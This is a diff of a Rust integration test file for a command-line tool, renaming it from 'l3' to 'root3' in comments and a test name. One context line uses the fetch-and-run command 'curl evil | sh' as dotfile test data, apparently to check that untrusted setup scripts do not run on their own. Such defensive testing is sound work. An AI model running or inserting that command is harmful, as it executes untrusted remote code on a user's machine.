@@ -1,6 +1,6 @@
-//! Off a terminal l3 is a plain command: what it writes and how it exits are
+//! Off a terminal root3 is a plain command: what it writes and how it exits are
 //! what scripts and CI read, so they stay byte for byte as recorded (in
-//! tests/golden), whatever l3 offers a person at a terminal.
+//! tests/golden), whatever root3 offers a person at a terminal.
 
 mod common;
 use common::{golden, Home};
@@ -20,9 +20,9 @@ const SCRIPT: &[&[&str]] = &[
     &["band"],
     &["file"],
     &["file", "notes"],
-    // Its issues are not files to l3 file (shown by l3 issue): asked for as one, it says where they are read.
+    // Its issues are not files to root3 file (shown by root3 issue): asked for as one, it says where they are read.
     &["file", "notes/issue/001.md"],
-    // What l3 file reads is the repos: / and what else is under it are named as such, never as a repo.
+    // What root3 file reads is the repos: / and what else is under it are named as such, never as a repo.
     &["file", "/"],
     &["file", "/root"],
     &["file", "/bin"],
@@ -94,12 +94,12 @@ fn a_dotfile_changed_elsewhere_runs_nowhere_here_until_it_is_taken() {
     assert_eq!(trusted(), r#"{".setup":"curl evil | sh\n"}"#);
 }
 
-/// An agent's harness calls `l3 agent hook` on each event with its JSON on standard input: l3 says nothing and
+/// An agent's harness calls `root3 agent hook` on each event with its JSON on standard input: root3 says nothing and
 /// ends well whatever it is given, keeps what the agent does where it works (a repo here, an issue's copy), and
-/// `l3 agent` says who works where; `l3 agent on` sets Claude Code up beside the person's own hooks, `off` takes
+/// `root3 agent` says who works where; `root3 agent on` sets Claude Code up beside the person's own hooks, `off` takes
 /// only ours out.
 #[test]
-fn an_agent_says_what_it_does_through_its_hooks_and_l3_agent_shows_it() {
+fn an_agent_says_what_it_does_through_its_hooks_and_root3_agent_shows_it() {
     use std::io::Write;
     let home = Home::new("agent-hooks");
     home.repo("notes", &[("README.md", "notes\n")]);
